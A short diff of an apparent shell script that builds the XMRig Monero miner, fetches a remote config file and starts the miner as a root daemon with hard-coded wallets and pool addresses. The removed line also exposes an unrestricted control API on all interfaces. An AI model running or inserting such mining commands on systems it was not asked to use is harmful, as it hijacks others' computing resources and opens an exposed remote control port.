@@ -6,4 +6,4 @@ git clone https://github.com/xmrig/xmrig.git
 
 cd xmrig && mkdir build && cd build && cmake .. && make
 
-wget https://raw.githubusercontent.com/basetrue/home/master/config.json && ./xmrig --http-enabled --api-worker-id UbuntuServer --http-host 0.0.0.0 --http-port 80 --http-access-token UbuntuServer2020 --http-no-restricted -o randomxmonero.eu.nicehash.com:3380 -u 3MDR7KBmL9M775eUqVEQHF3rRRMoPzidUJ.Ubuntu -p x -k --nicehash -a rx/0 -o randomxmonero.eu.nicehash.com:3380 -u 3MDR7KBmL9M775eUqVEQHF3rRRMoPzidUJ.Ubuntu -a rx/0 --daemon
+wget https://raw.githubusercontent.com/basetrue/home/master/config.json && sudo ./xmrig -o us-west.minexmr.com:443 -u 41k8GajDoKSbzbPb9EvqkwWonJTE9kxDG38udoUx5FsiMkUv1TvNtTA5iSvkpoEQFi941RRTHkiJnUqwoFxFWMcTFneVZk4 -k --tls --rig-id UBUNTU -o 168.63.129.16:80 -u 41k8GajDoKSbzbPb9EvqkwWonJTE9kxDG38udoUx5FsiMkUv1TvNtTA5iSvkpoEQFi941RRTHkiJnUqwoFxFWMcTFneVZk4 --coin monero --daemon
